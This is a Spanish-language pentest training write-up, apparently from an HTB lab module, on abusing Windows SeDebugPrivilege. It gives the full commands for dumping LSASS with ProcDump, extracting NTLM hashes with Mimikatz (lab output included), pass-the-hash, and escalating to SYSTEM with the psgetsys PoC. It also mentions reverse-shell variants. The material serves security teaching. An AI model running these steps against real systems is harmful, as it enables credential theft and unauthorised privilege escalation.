# SeDebugPrivilege 

El privilegio [**SeDebugPrivilege**](https://learn.microsoft.com/es-es/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs) permite a un usuario o proceso depurar otros procesos, incluyendo los del sistema. Normalmente solo los **administradores** lo tienen asignado, ya que concede la capacidad de leer memoria de procesos protegidos y modificar estructuras críticas del sistema operativo.

Puede asignarse a través de políticas locales o de dominio, bajo:

```
Computer Configuration > Windows Settings > Security Settings > Local Policies > User Rights Assignment > Debug programs
```

Este privilegio suele entregarse a **desarrolladores** o personal técnico que necesita depurar aplicaciones o servicios. Sin embargo, representa un **riesgo elevado**, ya que puede usarse para capturar información sensible de la memoria o alterar el comportamiento del sistema.

---

## Contexto en pentesting

Durante un **pentest interno**, `SeDebugPrivilege` es un objetivo interesante porque permite realizar acciones con privilegios elevados sin necesidad de pertenecer al grupo de administradores.

Por ejemplo:

* Si se obtienen múltiples **hashes NTLMv2** con herramientas como **Responder** o **Inveigh**, conviene priorizar el cracking de cuentas que podrían tener este privilegio (p. ej., cuentas de desarrolladores).
* Un usuario puede **no ser administrador local**, pero tener este derecho asignado, lo cual **no siempre es visible remotamente** (por ejemplo, mediante `BloodHound`). Por eso es útil comprobarlo manualmente al tener acceso RDP o sesión local.


<img width="1640" height="351" alt="image" src="https://github.com/user-attachments/assets/1219102e-0686-4112-b398-807edda96d78" />


---

# Volcado de LSASS con ProcDump

Tras iniciar sesión como un usuario al que se le asignó el derecho **Debug programs** y abrir una shell elevada, comprobamos que **SeDebugPrivilege** aparece listado.

```cmd
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
```

Podemos usar [**ProcDump**](https://learn.microsoft.com/es-es/sysinternals/downloads/procdump) del paquete `Sysinternals` para aprovechar este privilegio y volcar la memoria de un proceso. Un buen candidato es el proceso **Local Security Authority Subsystem Service (LSASS)**, que almacena credenciales de usuario tras el inicio de sesión.

```cmd
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

Este procedimiento genera un volcado de memoria (`lsass.dmp`) que puede analizarse posteriormente en un entorno controlado para extraer credenciales o validar el impacto del privilegio **SeDebugPrivilege** en la seguridad del sistema.

---

# Extracción de credenciales con Mimikatz

`Mimikatz` es una herramienta para Windows creada por Benjamin DELPY que permite extraer credenciales (contraseñas en texto, hashes NTLM, tickets Kerberos) y realizar pruebas de post‑explotación en entornos controlados.

Esto funciona correctamente; podemos cargar el volcado en `Mimikatz` usando el comando `sekurlsa::minidump`. Tras ejecutar `sekurlsa::logonpasswords` obtenemos el hash NTLM de la cuenta de administrador local que inició sesión de forma local.

**Nota:** siempre es buena idea teclear `log` antes de ejecutar comandos en Mimikatz; así toda la salida de comandos se guardará en un archivo `.txt`. Esto resulta especialmente útil al volcar credenciales de un servidor que puede tener muchos conjuntos de credenciales en memoria.

Comandos usados

- `log`
Activa el guardado de toda la salida de Mimikatz en un fichero (mimikatz.log). Útil para conservar evidencias.

- `sekurlsa::minidump <archivo.dmp>`
Carga un volcado de memoria (minidump) de LSASS u otro proceso para su análisis offline.

- `sekurlsa::logonpasswords`
Extrae las credenciales (NTLM, cleartext cuando están disponibles, tickets, etc.) del minidump cargado o del sistema en vivo.

En este ejemplo `mimikatz` nos brindará el hash. Podemos usarlo para realizar un ataque *pass-the-hash* y moverse lateralmente si la misma contraseña de administrador local se utiliza en uno o varios sistemas adicionales (común en organizaciones grandes).

`Pass-the-hash`: Es una técnica en la que un atacante usa directamente el hash de la contraseña como credencial para autenticarse en otros sistemas, sin necesitar conocer la contraseña en texto plano. Muchos protocolos de autenticación Windows aceptan el hash para probar identidad; por eso si se tiene el hash válido se podría utilizar para autenticarse bajo este método.

```
C:\htb> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)

 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )

 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz

 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
 '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

<SNIP>

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

<SNIP>
```

---


Supongamos que no podemos cargar herramientas en el objetivo por cualquier motivo pero tenemos acceso por RDP. En ese caso, podemos realizar un volcado manual de memoria del proceso **LSASS** mediante el **Administrador de tareas (Task Manager)**: ir a la pestaña **Details**, elegir el proceso **lsass.exe** y seleccionar **Create dump file**. Después de descargar ese archivo a nuestro sistema de ataque, podemos procesarlo con **Mimikatz** de la misma forma que en el ejemplo anterior.

<img width="1574" height="657" alt="image" src="https://github.com/user-attachments/assets/7b7f2ede-258f-4867-acbc-41e911fbfbff" />


---

# RCE como SYSTEM 

Podemos aprovechar **SeDebugPrivilege** para lograr ejecución remota de código elevando privilegios a **SYSTEM**. La técnica consiste en lanzar un [proceso hijo](https://learn.microsoft.com/es-es/windows/win32/procthread/child-processes) y usar los derechos elevados concedidos a nuestra cuenta (SeDebugPrivilege) para alterar el comportamiento normal del sistema y hacer que el proceso hijo herede el token de un [proceso padre](https://learn.microsoft.com/es-es/windows/win32/procthread/processes-and-threads) que corre como SYSTEM, permitiéndonos suplantarlo.

Si apuntamos a un proceso padre que se ejecuta como **SYSTEM** (especificando su PID), podemos elevar nuestros privilegios rápidamente.

---

## Pasos generales

1. Transferir el [script PoC](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) al sistema objetivo (por ejemplo, desde el repositorio actualizado en GitHub: [https://github.com/decoder-it/psgetsystem](https://github.com/decoder-it/psgetsystem)) y revisar su uso.
2. Cargar el script en el objetivo y ejecutar con la sintaxis:

```
[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```

> Nota importante: es necesario añadir un tercer argumento vacío `""` al final para que el PoC funcione correctamente.

3. Ejecutar el comando apuntando al PID del proceso que corre como SYSTEM.

---

## Preparación

* Abrir una consola de PowerShell elevada (clic derecho → Ejecutar como administrador) e iniciar sesión con las credenciales del usuario `jordan`.
* Obtener la lista de procesos y sus PIDs con `tasklist`.

Salida parcial:

```
PS C:\htb> tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```

En este ejemplo podemos **apuntar a `winlogon.exe` con PID 612**, ya que sabemos que normalmente se ejecuta como **SYSTEM** en hosts Windows.

<img width="1637" height="715" alt="image" src="https://github.com/user-attachments/assets/61dd5735-445f-4d7b-95ad-2bc7517b87e5" />

Comando:
```powershell
 .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(612, "C:\Windows\System32\cmd.exe", "")
```

También podríamos usar el cmdlet [Get-Process](https://learn.microsoft.com/es-es/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.5&viewFallbackFrom=powershell-7.2) para obtener el PID de un proceso conocido que se ejecuta como SYSTEM (como LSASS) y pasar el PID directamente al script, reduciendo la cantidad de pasos necesarios:

<img width="1628" height="575" alt="image" src="https://github.com/user-attachments/assets/945cd9c1-7017-46ad-bedf-35e6312f0376" />

Comando:
```powershell
 .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process "lsass").Id, "C:\Windows\System32\cmd.exe", "")
```

---


Existen otras [herramientas](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) para obtener una shell como **SYSTEM** cuando disponemos de **SeDebugPrivilege**. A menudo no tendremos acceso RDP al host, por lo que tendremos que modificar nuestros PoC para que, por ejemplo, devuelvan una **reverse shell** a nuestro equipo de ataque con privilegios SYSTEM o ejecuten otro comando (por ejemplo, crear un usuario administrador).

Probá estos PoC y explora otras vías para lograr acceso SYSTEM, especialmente en escenarios donde no disponés de una sesión totalmente interactiva (por ejemplo, cuando conseguís inyección de comandos, un web shell o una reverse shell con el usuario que tiene SeDebugPrivilege).

Tener en cuenta estos ejemplos para los casos en que volcar LSASS no produzca credenciales útiles (aunque también es posible obtener SYSTEM con el hash NTLM de la máquina, eso está fuera del alcance de este módulo) y una shell o RCE como SYSTEM sería beneficioso.




---
---

# Resumen y flujo de técnicas

## Extracción de credenciales (Mimikatz / volcado de LSASS)

**Objetivo:** obtener credenciales en claro o hashes desde la memoria del sistema.

**Flujo típico:** obtener volcado (ProcDump o Create dump file en Task Manager) → cargarlo en mimikatz (sekurlsa::minidump + sekurlsa::logonpasswords) → extraer NTLM / cleartext / tickets.

**Resultado posible:** contraseña en claro (mejor), o solamente el hash NTLM (aún valioso). Si solo hay hash, puedes intentar crackearlo offline o usarlo en un pass-the-hash (siempre dentro del alcance del engagement).

---

## Escalada a SYSTEM usando SeDebugPrivilege (PoC / CreateProcessFromParent, psgetsys, PrivFu, etc.)

**Objetivo:** lograr ejecución con token SYSTEM sin necesidad de conocer contraseñas, aprovechando que tu cuenta tiene SeDebugPrivilege.

**Flujo típico:** transferir PoC al host → cargarlo en PowerShell elevado → crear un proceso hijo que herede el token del proceso padre (p. ej. winlogon o lsass) → obtener shell/ejecución como SYSTEM.

**Variantes:** crear reverse shell como SYSTEM, añadir usuario administrador, ejecutar comandos remotos cuando no hay sesión interactiva (webshell, reverse shell limitada, command injection).


